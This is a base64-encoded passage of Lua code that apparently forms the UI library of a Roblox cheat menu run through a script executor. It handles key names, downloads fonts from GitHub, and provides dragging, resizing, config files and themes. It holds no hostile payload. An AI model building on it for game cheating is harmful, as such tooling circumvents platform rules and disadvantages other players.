RW51bS5LZXlDb2RlLk1pbnVzXSA9ICItIiwKICAgICAgICBbRW51bS5LZXlDb2RlLkVxdWFsc10gPSAiPSIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5UaWxkZV0gPSAifiIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5MZWZ0QnJhY2tldF0gPSAiWyIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5SaWdodEJyYWNrZXRdID0gIl0iLAogICAgICAgIFtFbnVtLktleUNvZGUuUmlnaHRQYXJlbnRoZXNpc10gPSAiKSIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5MZWZ0UGFyZW50aGVzaXNdID0gIigiLAogICAgICAgIFtFbnVtLktleUNvZGUuU2VtaWNvbG9uXSA9ICIsIiwKICAgICAgICBbRW51bS5LZXlDb2RlLlF1b3RlXSA9ICInIiwKICAgICAgICBbRW51bS5LZXlDb2RlLkJhY2tTbGFzaF0gPSAiXFwiLAogICAgICAgIFtFbnVtLktleUNvZGUuQ29tbWFdID0gIiwiLAogICAgICAgIFtFbnVtLktleUNvZGUuUGVyaW9kXSA9ICIuIiwKICAgICAgICBbRW51bS5LZXlDb2RlLlNsYXNoXSA9ICIvIiwKICAgICAgICBbRW51bS5LZXlDb2RlLkFzdGVyaXNrXSA9ICIqIiwKICAgICAgICBbRW51bS5LZXlDb2RlLlBsdXNdID0gIisiLAogICAgICAgIFtFbnVtLktleUNvZGUuUGVyaW9kXSA9ICIuIiwKICAgICAgICBbRW51bS5LZXlDb2RlLkJhY2txdW90ZV0gPSAiYCIsCiAgICAgICAgW0VudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjFdID0gIk1CMSIsCiAgICAgICAgW0VudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjJdID0gIk1CMiIsCiAgICAgICAgW0VudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjNdID0gIk1CMyIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5Fc2NhcGVdID0gIkVTQyIsCiAgICAgICAgW0VudW0uS2V5Q29kZS5TcGFjZV0gPSAiU1BDIiwKICAgICAgICBbRW51bS5LZXlDb2RlLkVuZF0gPSAiRU5EIiwKICAgIH0KICAgICAgICAKICAgIGxpYnJhcnkuX19pbmRleCA9IGxpYnJhcnkKCiAgICBsb2NhbCBmbGFncyA9IGxpYnJhcnkuZmxhZ3MgCiAgICBsb2NhbCBjb25maWdfZmxhZ3MgPSBsaWJyYXJ5LmNvbmZpZ19mbGFncwogICAgbG9jYWwgbm90aWZpY2F0aW9ucyA9IGxpYnJhcnkubm90aWZpY2F0aW9ucyAKCiAgICBsb2NhbCBmb250cyA9IHt9OyBkbwogICAgICAgIGZ1bmN0aW9uIFJlZ2lzdGVyX0ZvbnQoTmFtZSwgV2VpZ2h0LCBTdHlsZSwgQXNzZXQpCiAgICAgICAgICAgIGlmIG5vdCBpc2ZpbGUoQXNzZXQuSWQpIHRoZW4KICAgICAgICAgICAgICAgIHdyaXRlZmlsZShBc3NldC5JZCwgQXNzZXQuRm9udCkKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiBpc2ZpbGUoTmFtZSAuLiAiLmZvbnQiKSB0aGVuCiAgICAgICAgICAgICAgICBkZWxmaWxlKE5hbWUgLi4gIi5mb250IikKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBsb2NhbCBEYXRhID0gewogICAgICAgICAgICAgICAgbmFtZSA9IE5hbWUsCiAgICAgICAgICAgICAgICBmYWNlcyA9IHsKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUgPSAiTm9ybWFsIiwKICAgICAgICAgICAgICAgICAgICAgICAgd2VpZ2h0ID0gV2VpZ2h0LAogICAgICAgICAgICAgICAgICAgICAgICBzdHlsZSA9IFN0eWxlLAogICAgICAgICAgICAgICAgICAgICAgICBhc3NldElkID0gZ2V0Y3VzdG9tYXNzZXQoQXNzZXQuSWQpLAogICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICB9CgogICAgICAgICAgICB3cml0ZWZpbGUoTmFtZSAuLiAiLmZvbnQiLCBodHRwX3NlcnZpY2U6SlNPTkVuY29kZShEYXRhKSkKCiAgICAgICAgICAgIHJldHVybiBnZXRjdXN0b21hc3NldChOYW1lIC4uICIuZm9udCIpOwogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGxvY2FsIE1lZGl1bSA9IFJlZ2lzdGVyX0ZvbnQoIk1lZGl1bSIsIDIwMCwgIk5vcm1hbCIsIHsKICAgICAgICAgICAgSWQgPSAiTWVkaXVtLnR0ZiIsCiAgICAgICAgICAgIEZvbnQgPSBnYW1lOkh0dHBHZXQoImh0dHBzOi8vZ2l0aHViLmNvbS9pNzdsaG0vc3RvcmFnZS9yYXcvcmVmcy9oZWFkcy9tYWluL2ZvbnRzL0ludGVyXzI4cHQtTWVkaXVtLnR0ZiIpLAogICAgICAgIH0pCgogICAgICAgIGxvY2FsIFNlbWlCb2xkID0gUmVnaXN0ZXJfRm9udCgiU2VtaUJvbGQiLCAyMDAsICJOb3JtYWwiLCB7CiAgICAgICAgICAgIElkID0gIlNlbWlCb2xkLnR0ZiIsCiAgICAgICAgICAgIEZvbnQgPSBnYW1lOkh0dHBHZXQoImh0dHBzOi8vZ2l0aHViLmNvbS9pNzdsaG0vc3RvcmFnZS9yYXcvcmVmcy9oZWFkcy9tYWluL2ZvbnRzL0ludGVyXzI4cHQtU2VtaUJvbGQudHRmIiksCiAgICAgICAgfSkKCiAgICAgICAgZm9udHMgPSB7CiAgICAgICAgICAgIHNtYWxsID0gRm9udC5uZXcoTWVkaXVtLCBFbnVtLkZvbnRXZWlnaHQuUmVndWxhciwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKICAgICAgICAgICAgZm9udCA9IEZvbnQubmV3KFNlbWlCb2xkLCBFbnVtLkZvbnRXZWlnaHQuUmVndWxhciwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKICAgICAgICB9CiAgICBlbmQKLS0KCi0tIExpYnJhcnkgZnVuY3Rpb25zIAogICAgLS0gTWlzYyBmdW5jdGlvbnMKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OnR3ZWVuKG9iaiwgcHJvcGVydGllcywgZWFzaW5nX3N0eWxlLCB0aW1lKSAKICAgICAgICAgICAgbG9jYWwgdHdlZW4gPSB0d2Vlbl9zZXJ2aWNlOkNyZWF0ZShvYmosIFR3ZWVuSW5mby5uZXcodGltZSBvciAwLjI1LCBlYXNpbmdfc3R5bGUgb3IgRW51bS5FYXNpbmdTdHlsZS5RdWludCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uSW5PdXQsIDAsIGZhbHNlLCAwKSwgcHJvcGVydGllcyk6UGxheSgpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgcmV0dXJuIHR3ZWVuCiAgICAgICAgZW5kCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6cmVzaXppZnkoZnJhbWUpIAogICAgICAgICAgICBsb2NhbCBGcmFtZSA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICAgICAgICAgIEZyYW1lLlBvc2l0aW9uID0gZGltMigxLCAtMTAsIDEsIC0xMCkKICAgICAgICAgICAgRnJhbWUuQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApCiAgICAgICAgICAgIEZyYW1lLlNpemUgPSBkaW0yKDAsIDEwLCAwLCAxMCkKICAgICAgICAgICAgRnJhbWUuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgICAgICAgICBGcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgIEZyYW1lLlBhcmVudCA9IGZyYW1lCiAgICAgICAgICAgIEZyYW1lLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxIAogICAgICAgICAgICBGcmFtZS5UZXh0ID0gIiIKCiAgICAgICAgICAgIGxvY2FsIHJlc2l6aW5nID0gZmFsc2UgCiAgICAgICAgICAgIGxvY2FsIHN0YXJ0X3NpemUgCiAgICAgICAgICAgIGxvY2FsIHN0YXJ0IAogICAgICAgICAgICBsb2NhbCBvZ19zaXplID0gZnJhbWUuU2l6ZSAgCgogICAgICAgICAgICBGcmFtZS5JbnB1dEJlZ2FuOkNvbm5lY3QoZnVuY3Rpb24oaW5wdXQpCiAgICAgICAgICAgICAgICBpZiBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Nb3VzZUJ1dHRvbjEgdGhlbgogICAgICAgICAgICAgICAgICAgIHJlc2l6aW5nID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgIHN0YXJ0ID0gaW5wdXQuUG9zaXRpb24KICAgICAgICAgICAgICAgICAgICBzdGFydF9zaXplID0gZnJhbWUuU2l6ZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIEZyYW1lLklucHV0RW5kZWQ6Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKICAgICAgICAgICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcmVzaXppbmcgPSBmYWxzZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKCiAgICAgICAgICAgIGxpYnJhcnk6Y29ubmVjdGlvbih1aXMuSW5wdXRDaGFuZ2VkLCBmdW5jdGlvbihpbnB1dCwgZ2FtZV9ldmVudCkgCiAgICAgICAgICAgICAgICBpZiByZXNpemluZyBhbmQgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuTW91c2VNb3ZlbWVudCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmlld3BvcnRfeCA9IGNhbWVyYS5WaWV3cG9ydFNpemUuWAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZpZXdwb3J0X3kgPSBjYW1lcmEuVmlld3BvcnRTaXplLlkKCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY3VycmVudF9zaXplID0gZGltMigKICAgICAgICAgICAgICAgICAgICAgICAgc3RhcnRfc2l6ZS5YLlNjYWxlLAogICAgICAgICAgICAgICAgICAgICAgICBtYXRoLmNsYW1wKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RhcnRfc2l6ZS5YLk9mZnNldCArIChpbnB1dC5Qb3NpdGlvbi5YIC0gc3RhcnQuWCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvZ19zaXplLlguT2Zmc2V0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmlld3BvcnRfeAogICAgICAgICAgICAgICAgICAgICAgICApLAogICAgICAgICAgICAgICAgICAgICAgICBzdGFydF9zaXplLlkuU2NhbGUsCiAgICAgICAgICAgICAgICAgICAgICAgIG1hdGguY2xhbXAoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydF9zaXplLlkuT2Zmc2V0ICsgKGlucHV0LlBvc2l0aW9uLlkgLSBzdGFydC5ZKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9nX3NpemUuWS5PZmZzZXQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2aWV3cG9ydF95CiAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICApCgogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oZnJhbWUsIHtTaXplID0gY3VycmVudF9zaXplfSwgRW51bS5FYXNpbmdTdHlsZS5MaW5lYXIsIDAuMDUpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZCAKCiAgICAgICAgZnVuY3Rpb24gZmFnKHRibCkKICAgICAgICAgICAgbG9jYWwgU2l6ZSA9IDAKICAgICAgICAgICAgCiAgICAgICAgICAgIGZvciBfIGluIHRibCBkbwogICAgICAgICAgICAgICAgU2l6ZSA9IFNpemUgKyAxCiAgICAgICAgICAgIGVuZAogICAgICAgIAogICAgICAgICAgICByZXR1cm4gU2l6ZQogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6bmV4dF9mbGFnKCkKICAgICAgICAgICAgbG9jYWwgaW5kZXggPSBmYWcobGlicmFyeS5mbGFncykgKyAxOwogICAgICAgICAgICBsb2NhbCBzdHIgPSBzdHJpbmcuZm9ybWF0KCJmbGFnbnVtYmVyJXMiLCBpbmRleCkKICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybiBzdHI7CiAgICAgICAgZW5kIAoKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5Om1vdXNlX2luX2ZyYW1lKHVpb2JqZWN0KQogICAgICAgICAgICBsb2NhbCB5X2NvbmQgPSB1aW9iamVjdC5BYnNvbHV0ZVBvc2l0aW9uLlkgPD0gbW91c2UuWSBhbmQgbW91c2UuWSA8PSB1aW9iamVjdC5BYnNvbHV0ZVBvc2l0aW9uLlkgKyB1aW9iamVjdC5BYnNvbHV0ZVNpemUuWQogICAgICAgICAgICBsb2NhbCB4X2NvbmQgPSB1aW9iamVjdC5BYnNvbHV0ZVBvc2l0aW9uLlggPD0gbW91c2UuWCBhbmQgbW91c2UuWCA8PSB1aW9iamVjdC5BYnNvbHV0ZVBvc2l0aW9uLlggKyB1aW9iamVjdC5BYnNvbHV0ZVNpemUuWAoKICAgICAgICAgICAgcmV0dXJuICh5X2NvbmQgYW5kIHhfY29uZCkKICAgICAgICBlbmQKCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTpkcmFnZ2lmeShmcmFtZSkKICAgICAgICAgICAgbG9jYWwgZHJhZ2dpbmcgPSBmYWxzZSAKICAgICAgICAgICAgbG9jYWwgc3RhcnRfc2l6ZSA9IGZyYW1lLlBvc2l0aW9uCiAgICAgICAgICAgIGxvY2FsIHN0YXJ0IAoKICAgICAgICAgICAgZnJhbWUuSW5wdXRCZWdhbjpDb25uZWN0KExQSF9OT19WSVJUVUFMSVpFKGZ1bmN0aW9uKGlucHV0KQogICAgICAgICAgICAgICAgaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuTW91c2VCdXR0b24xIHRoZW4KICAgICAgICAgICAgICAgICAgICBkcmFnZ2luZyA9IHRydWUKICAgICAgICAgICAgICAgICAgICBzdGFydCA9IGlucHV0LlBvc2l0aW9uCiAgICAgICAgICAgICAgICAgICAgc3RhcnRfc2l6ZSA9IGZyYW1lLlBvc2l0aW9uCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKSkKCiAgICAgICAgICAgIGZyYW1lLklucHV0RW5kZWQ6Q29ubmVjdChMUEhfTk9fVklSVFVBTElaRShmdW5jdGlvbihpbnB1dCkKICAgICAgICAgICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZHJhZ2dpbmcgPSBmYWxzZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkpCgogICAgICAgICAgICBsaWJyYXJ5OmNvbm5lY3Rpb24odWlzLklucHV0Q2hhbmdlZCwgTFBIX05PX1ZJUlRVQUxJWkUoZnVuY3Rpb24oaW5wdXQsIGdhbWVfZXZlbnQpIAogICAgICAgICAgICAgICAgaWYgZHJhZ2dpbmcgYW5kIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlTW92ZW1lbnQgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHZpZXdwb3J0X3ggPSBjYW1lcmEuVmlld3BvcnRTaXplLlgKICAgICAgICAgICAgICAgICAgICBsb2NhbCB2aWV3cG9ydF95ID0gY2FtZXJhLlZpZXdwb3J0U2l6ZS5ZCgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGN1cnJlbnRfcG9zaXRpb24gPSBkaW0yKAogICAgICAgICAgICAgICAgICAgICAgICAwLAogICAgICAgICAgICAgICAgICAgICAgICBjbGFtcCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0X3NpemUuWC5PZmZzZXQgKyAoaW5wdXQuUG9zaXRpb24uWCAtIHN0YXJ0LlgpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZpZXdwb3J0X3ggLSBmcmFtZS5TaXplLlguT2Zmc2V0CiAgICAgICAgICAgICAgICAgICAgICAgICksCiAgICAgICAgICAgICAgICAgICAgICAgIDAsCiAgICAgICAgICAgICAgICAgICAgICAgIG1hdGguY2xhbXAoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydF9zaXplLlkuT2Zmc2V0ICsgKGlucHV0LlBvc2l0aW9uLlkgLSBzdGFydC5ZKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2aWV3cG9ydF95IC0gZnJhbWUuU2l6ZS5ZLk9mZnNldAogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgKQoKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGZyYW1lLCB7UG9zaXRpb24gPSBjdXJyZW50X3Bvc2l0aW9ufSwgRW51bS5FYXNpbmdTdHlsZS5MaW5lYXIsIDAuMDUpCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjbG9zZV9lbGVtZW50KCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpKQogICAgICAgIGVuZCAKCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTpjb252ZXJ0KHN0cikKICAgICAgICAgICAgbG9jYWwgdmFsdWVzID0ge30KCiAgICAgICAgICAgIGZvciB2YWx1ZSBpbiBzdHJpbmcuZ21hdGNoKHN0ciwgIlteLF0rIikgZG8KICAgICAgICAgICAgICAgIGluc2VydCh2YWx1ZXMsIHRvbnVtYmVyKHZhbHVlKSkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAjdmFsdWVzID09IDQgdGhlbiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByZXR1cm4gdW5wYWNrKHZhbHVlcykKICAgICAgICAgICAgZWxzZSAKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OmNvbnZlcnRfZW51bShlbnVtKQogICAgICAgICAgICBsb2NhbCBlbnVtX3BhcnRzID0ge30KICAgICAgICAKICAgICAgICAgICAgZm9yIHBhcnQgaW4gc3RyaW5nLmdtYXRjaChlbnVtLCAiWyV3X10rIikgZG8KICAgICAgICAgICAgICAgIGluc2VydChlbnVtX3BhcnRzLCBwYXJ0KQogICAgICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAgICAgbG9jYWwgZW51bV90YWJsZSA9IEVudW0KICAgICAgICAgICAgZm9yIGkgPSAyLCAjZW51bV9wYXJ0cyBkbwogICAgICAgICAgICAgICAgbG9jYWwgZW51bV9pdGVtID0gZW51bV90YWJsZVtlbnVtX3BhcnRzW2ldXQogICAgICAgIAogICAgICAgICAgICAgICAgZW51bV90YWJsZSA9IGVudW1faXRlbQogICAgICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAgICAgcmV0dXJuIGVudW1fdGFibGUKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgY29uZmlnX2hvbGRlcjsKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OnVwZGF0ZV9jb25maWdfbGlzdCgpIAogICAgICAgICAgICBpZiBub3QgY29uZmlnX2hvbGRlciB0aGVuIAogICAgICAgICAgICAgICAgcmV0dXJuIAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGxpc3QgPSB7fQogICAgICAgICAgICAKICAgICAgICAgICAgZm9yIGlkeCwgZmlsZSBpbiBsaXN0ZmlsZXMobGlicmFyeS5kaXJlY3RvcnkgLi4gIi9jb25maWdzIikgZG8KICAgICAgICAgICAgICAgIGxvY2FsIG5hbWUgPSBmaWxlOmdzdWIobGlicmFyeS5kaXJlY3RvcnkgLi4gIi9jb25maWdzXFwiLCAiIik6Z3N1YigiLmNmZyIsICIiKTpnc3ViKGxpYnJhcnkuZGlyZWN0b3J5IC4uICJcXGNvbmZpZ3NcXCIsICIiKQogICAgICAgICAgICAgICAgbGlzdFsjbGlzdCArIDFdID0gbmFtZQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGNvbmZpZ19ob2xkZXIucmVmcmVzaF9vcHRpb25zKGxpc3QpCiAgICAgICAgZW5kIAoKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OmdldF9jb25maWcoKQogICAgICAgICAgICBsb2NhbCBDb25maWcgPSB7fQogICAgICAgICAgICAKICAgICAgICAgICAgZm9yIF8sIHYgaW4gbmV4dCwgZmxhZ3MgZG8KICAgICAgICAgICAgICAgIGlmIHR5cGUodikgPT0gInRhYmxlIiBhbmQgdi5rZXkgdGhlbgogICAgICAgICAgICAgICAgICAgIENvbmZpZ1tfXSA9IHthY3RpdmUgPSB2LmFjdGl2ZSwgbW9kZSA9IHYubW9kZSwga2V5ID0gdG9zdHJpbmcodi5rZXkpfQogICAgICAgICAgICAgICAgZWxzZWlmIHR5cGUodikgPT0gInRhYmxlIiBhbmQgdlsiVHJhbnNwYXJlbmN5Il0gYW5kIHZbIkNvbG9yIl0gdGhlbgogICAgICAgICAgICAgICAgICAgIENvbmZpZ1tfXSA9IHtUcmFuc3BhcmVuY3kgPSB2WyJUcmFuc3BhcmVuY3kiXSwgQ29sb3IgPSB2WyJDb2xvciJdOlRvSGV4KCl9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgQ29uZmlnW19dID0gdgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybiBodHRwX3NlcnZpY2U6SlNPTkVuY29kZShDb25maWcpCiAgICAgICAgZW5kCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6bG9hZF9jb25maWcoY29uZmlnX2pzb24pIAogICAgICAgICAgICBsb2NhbCBjb25maWcgPSBodHRwX3NlcnZpY2U6SlNPTkRlY29kZShjb25maWdfanNvbikKICAgICAgICAgICAgCiAgICAgICAgICAgIGZvciBfLCB2IGluIGNvbmZpZyBkbyAKICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uX3NldCA9IGxpYnJhcnkuY29uZmlnX2ZsYWdzW19dCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIF8gPT0gImNvbmZpZ19uYW1lX2xpc3QiIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgY29udGludWUgCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBmdW5jdGlvbl9zZXQgdGhlbiAKICAgICAgICAgICAgICAgICAgICBpZiB0eXBlKHYpID09ICJ0YWJsZSIgYW5kIHZbIlRyYW5zcGFyZW5jeSJdIGFuZCB2WyJDb2xvciJdIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb25fc2V0KGhleCh2WyJDb2xvciJdKSwgdlsiVHJhbnNwYXJlbmN5Il0pCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHR5cGUodikgPT0gInRhYmxlIiBhbmQgdlsiYWN0aXZlIl0gdGhlbiAKICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb25fc2V0KHYpCiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbl9zZXQodikKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgZW5kIAogICAgICAgIGVuZCAKICAgICAgICAKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OnJvdW5kKG51bWJlciwgZmxvYXQpIAogICAgICAgICAgICBsb2NhbCBtdWx0aXBsaWVyID0gMSAvIChmbG9hdCBvciAxKQoKICAgICAgICAgICAgcmV0dXJuIGZsb29yKG51bWJlciAqIG11bHRpcGxpZXIgKyAwLjUpIC8gbXVsdGlwbGllcgogICAgICAgIGVuZCAKCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTphcHBseV90aGVtZShpbnN0YW5jZSwgdGhlbWUsIHByb3BlcnR5KSAKICAgICAgICAgICAgaW5zZXJ0KHRoZW1lcy51dGlsaXR5W3RoZW1lXVtwcm9wZXJ0eV0sIGluc3RhbmNlKQogICAgICAgIGVuZAoKICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OnVwZGF0ZV90aGVtZSh0aGVtZSwgY29sb3IpCiAgICAgICAgICAgIGZvciBfLCBwcm9wZXJ0eSBpbiB0aGVtZXMudXRpbGl0eVt0aGVtZV0gZG8gCgogICAgICAgICAgICAgICAgZm9yIG0sIG9iamVjdCBpbiBwcm9wZXJ0eSBkbyAKICAgICAgICAgICAgICAgICAgICBpZiBvYmplY3RbX10gPT0gdGhlbWVzLnByZXNldFt0aGVtZV0gdGhlbiAKICAgICAgICAgICAgICAgICAgICAgICAgb2JqZWN0W19dID0gY29sb3IgCiAgICAgICAgICAgICAgICAgICAgZW5kIAogICAgICAgICAgICAgICAgZW5kIAogICAgICAgICAgICBlbmQgCgogICAgICAgICAgICB0aGVtZXMucHJlc2V0W3RoZW1lXSA9IGNvbG9yIAogICAgICAgIGVuZCAKCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTpjb25uZWN0aW9uKHNpZ25hbCwgY2FsbGJhY2spCiAgICAgICAgICAgIGxvY2FsIGNvbm5lY3Rpb24gPSBzaWduYWw6Q29ubmVjdChjYWxsYmFjaykKICAgICAgICAgICAgCiAgICAgICAgICAgIGluc2VydChsaWJyYXJ5LmNvbm5lY3Rpb25zLCBjb25uZWN0aW9uKQoKICAgICAgICAgICAgcmV0dXJuIGNvbm5lY3Rpb24gCiAgICAgICAgZW5kCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6Y2xvc2VfZWxlbWVudChuZXdfcGF0aCkgCiAgICAgICAgICAgIGxvY2FsIG9wZW5fZWxlbWVudCA9IGxpYnJhcnkuY3VycmVudF9vcGVuCgogICAgICAgICAgICBpZiBvcGVuX2VsZW1lbnQgYW5kIG5ld19wYXRoIH49IG9wZW5fZWxlbWVudCB0aGVuCiAgICAgICAgICAgICAgICBvcGVuX2VsZW1lbnQuc2V0X3Zpc2libGUoZmFsc2UpCiAgICAgICAgICAgICAgICBvcGVuX2VsZW1lbnQub3BlbiA9IGZhbHNlOwogICAgICAgICAgICBlbmQgCgogICAgICAgICAgICBpZiBuZXdfcGF0aCB+PSBvcGVuX2VsZW1lbnQgdGhlbiAKICAgICAgICAgICAgICAgIGxpYnJhcnkuY3VycmVudF9vcGVuID0gbmV3X3BhdGggb3IgbmlsOwogICAgICAgICAgICBlbmQKICAgICAgICBlbmQgCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6Y3JlYXRlKGluc3RhbmNlLCBvcHRpb25zKQogICAgICAgICAgICBsb2NhbCBpbnMgPSBJbnN0YW5jZS5uZXcoaW5zdGFuY2UpIAogICAgICAgICAgICAKICAgICAgICAgICAgZm9yIHByb3AsIHZhbHVlIGluIG9wdGlvbnMgZG8gCiAgICAgICAgICAgICAgICBpbnNbcHJvcF0gPSB2YWx1ZQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIHJldHVybiBpbnMgCiAgICAgICAgZW5kCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6dW5sb2FkX21lbnUoKSAKICAgICAgICAgICAgaWYgbGlicmFyeVsgIml0ZW1zIiBdIHRoZW4gCiAgICAgICAgICAgICAgICBsaWJyYXJ5WyAiaXRlbXMiIF06RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaWYgbGlicmFyeVsgIm90aGVyIiBdIHRoZW4gCiAgICAgICAgICAgICAgICBsaWJyYXJ5WyAib3RoZXIiIF06RGVzdHJveSgpCiAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgCiAgICAgICAgICAgIGZvciBpbmRleCwgY29ubmVjdGlvbiBpbiBsaWJyYXJ5LmNvbm5lY3Rpb25zIGRvIAogICAgICAgICAgICAgICAgY29ubmVjdGlvbjpEaXNjb25uZWN0KCkgCiAgICAgICAgICAgICAgICBjb25uZWN0aW9uID0gbmlsIAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxpYnJhcnkgPSBuaWwgCiAgICAgICAgZW5kIAogICAgLS0KICAgICAgICAtLVtbbG9jYWwgY3Vyc29yX3NjcmVlbmd1aSA9IGxpYnJhcnk6Y3JlYXRlKCJTY3JlZW5HdWkiLCB7CiAgICAgICAgICAgIFJlc2V0T25TcGF3biA9IGZhbHNlLAogICAgICAgICAgICBaSW5kZXhCZWhhdmlvciA9IEVudW0uWkluZGV4QmVoYXZpb3IuR2xvYmFsLAogICAgICAgICAgICBOYW1lID0gImVycm9yIC0gc3RhY2siLAogICAgICAgICAgICBJZ25vcmV